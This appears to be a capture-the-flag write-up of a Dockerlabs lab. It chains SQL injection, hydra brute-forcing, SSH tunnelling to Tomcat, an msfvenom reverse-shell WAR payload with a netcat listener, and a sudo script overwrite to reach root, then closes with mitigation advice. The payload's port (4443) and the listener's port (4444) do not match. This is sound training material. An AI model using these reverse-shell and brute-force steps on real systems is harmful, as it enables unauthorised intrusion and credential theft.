# CrackOff - CTF Laboratory Dockerlabs

## Executive Summary

CrackOff is a comprehensive hacking laboratory that simulates a realistic penetration testing scenario. Through multiple chained attack vectors, the laboratory demonstrates the exploitation of vulnerabilities such as SQL injection, brute-force attacks, web service exploitation, and privilege escalation. The objective is to obtain root access and capture flags from different system users.

---

## Phase 1: Reconnaissance and Service Identification

### Port Scanning

The laboratory begins with a port scan using nmap, revealing open ports 22 (SSH) and 80 (HTTP):

![alt text](img/1-Nmap.png)

### Directory Enumeration

Subsequently, a scan is performed using gobuster to detect accessible files and directories on the web server:

![alt text](img/2-gobuster.png)

### HTTP Service Exploration

The HTTP service on port 80 and the discovered directories are explored:

![alt text](img/3-http.png)

---

## Phase 2: SQL Injection Exploitation

### Vulnerability Identification

The "welcome" directory displays information indicating a potential SQL injection (SQLi) attack vector, which is taken into consideration for deeper analysis:

![alt text](img/5-httpWelcome.png)

### SQLi Testing on Login Panel

A login form is identified in the login.php section. Considering the information from the previous directory, SQL injection possibilities are tested:

![alt text](img/4httpLoghin.png)

The test yields the expected result, confirming the existence of this vulnerability:

![alt text](img/6-SQLiVulnerable.png)

### Data Extraction with SQLmap

With the vulnerability confirmed, the sqlmap tool is used to search for vulnerable databases, identifying two: `crackoff_db` and `crackofftrue_db`:

![alt text](img/7-dbsSQLi.png)

The table structure in both databases is verified. The first contains two tables (users and passwords) while the second contains only the users table:

![alt text](img/8-tablesSQLi.png)

### Database Content Review

The information stored in all tables is examined:

**crackoff_db:**

![alt text](img/9-CrackOFFUsers.png)
![alt text](img/9-CrackOffPasswords.png)

**crackofftrue_db:**

![alt text](img/10-CrackOFFtrueTable.png)

---

## Phase 3: Initial SSH Access

### Brute-Force Attack

In the tables, users and passwords can be observed. These credentials, when used in the login panel, lead to the "welcome" section, suggesting they are for the SSH service. The credentials are saved in `passwords.txt` and `users.txt` files, and hydra is used to execute a brute-force attack, obtaining the credentials for user `rosa`:

![alt text](img/11-hydra.png)

### SSH Connection as User Rosa

Logging in with the rosa user via SSH:

![alt text](img/12-sshRosa.png)

### Initial System Enumeration

Privilege escalation vectors are attempted by reviewing files, directories, and executing common commands such as `sudo -l`, without significant results:

![alt text](img/13-CommonVectorsRosa.png)

The `/etc/passwd` file is read, revealing the existence of two additional SSH users: `mario` and `alice`:

![alt text](img/14-CatEtcPasswd.png)

### Discovery of Sensitive Information

Reviewing other directories, a folder named `alice_note` is found containing a `note.txt` file with potentially sensitive information. Initially, it is considered that this could be alice's password, but it does not work for that purpose:

![alt text](img/15-AliceNote.png)

---

## Phase 4: Discovery of Tomcat Service

### Local Port Identification

After attempting multiple privilege escalation vectors, the active ports and URLs are examined using `netstat -ano`:

![alt text](img/16-netstatAno.png)

An Apache Tomcat service running on localhost:8080 is identified.

### Port Forwarding

To interact with this service, a port forwarding tunnel is established leveraging the SSH connection of user rosa:

![alt text](img/16-PortFowd.png)

With this configuration, the Tomcat service can be accessed at localhost:8080:

![alt text](img/17-TomcatHttp.png)

---

## Phase 5: Apache Tomcat Exploitation

### Payload Creation

After evaluating various attack vectors, an RCE (Remote Code Execution) attack via reverse shell is attempted. A malicious `shell.war` file is created that will execute a reverse shell on the attacker's machine, leveraging Tomcat Manager functionality. msfvenom is used to create the payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4443 -f war -o shell.war
```

### Tomcat Manager Authentication

To proceed with payload upload, Tomcat user credentials are required. A brute-force attack is executed with hydra against the Tomcat Manager authentication service:

![alt text](img/17-TomcatHydra.png)

The user credentials are successfully obtained:

![alt text](img/18-ManagerTomcat.png)

### Payload Upload and Execution

The created payload is uploaded to Tomcat and executed. It is important to maintain a netcat listener on the port specified during payload creation (in this case, port 4444):

```bash
nc -lnvp 4444
```
---

## Phase 6: Privilege Escalation to Root

### Reverse Shell Obtainment

A reverse shell is obtained with user `tomcat`. Executing `sudo -l` verifies that this user can execute a script called `catalina.sh` as root without requiring a password:

![alt text](img/19-ReverseShellTomcat.png)

### Binary Overwrite and Escalation

The `catalina.sh` binary by itself does not provide direct privilege escalation. However, since user `tomcat` has permissions to modify this file, it is overwritten with a shell that maintains the root SUID. Executing the modified binary grants access as the root user and the flag is captured:

![alt text](img/20-Catalina-Root.png)

**Root access has been achieved!**

---

## Phase 7: Additional Exploration (Bonus)

### Access to User Mario

A file with credentials for user `mario` is found. Connection is established via SSH:

![alt text](img/21-SshMario.png)

Reviewing mario's home directory, a flag corresponding to this user is found along with a `.kdbx` file, which is potentially related to user alice:

![alt text](img/22-FlagMario.png)

### Accessing Alice's Password

The `.kdbx` file is downloaded using `scp` and opened with Keepass2 to view its contents:

![alt text](img/23-scpAlice.png)

The document requires a password. After testing various potential credentials, the content of the `note.txt` file found near the beginning of the laboratory is used, which provides successful access:

![alt text](img/24-AlicePassword.png)

### SSH Connection as User Alice

Logging in as user alice:

![alt text](img/25-sshAlice.png)

An additional note exists in alice's directory. Although alternative vectors for privilege escalation with this user were explored (including processes running as root in the background), since the flags were obtained through the previous vector, this methodology was not included in this writeup.

---

## Conclusions and Recommendations

### Mitigation Recommendations

- **SQL Injection (SQLi):** Validate and parameterize all SQL queries. Use prepared statements and properly escape user input. Consider deploying a WAF for early detection.
- **Weak / Stored Credentials:** Enforce strong password policies and avoid storing credentials in plain text. Use secure hashing (bcrypt/argon2) with salt for passwords.
- **Brute-force Attacks:** Implement account lockout, throttling, and multi-factor authentication (MFA) for privileged access.
- **Tomcat / Web Management Access:** Restrict access to Tomcat Manager; disable remote deployments in production. Change default credentials and enforce strong authentication.
- **Insecure File Uploads:** Validate file extensions and MIME types, restrict write permissions on deployment directories, and prevent uploads that can execute arbitrary code.
- **Sudo and Permission Configuration:** Review `sudoers` entries and minimize commands allowed without password. Avoid granting permissions that allow modification of binaries or scripts executed as root by low-integrity accounts.
- **Secrets and KDBX Management:** Protect password databases with strong encryption and store keys securely. Avoid insecure file transfers and apply strict access controls per user.
- **Auditing and Monitoring:** Enable detailed logging and monitoring to detect suspicious activity, and perform regular security reviews and penetration tests.

---

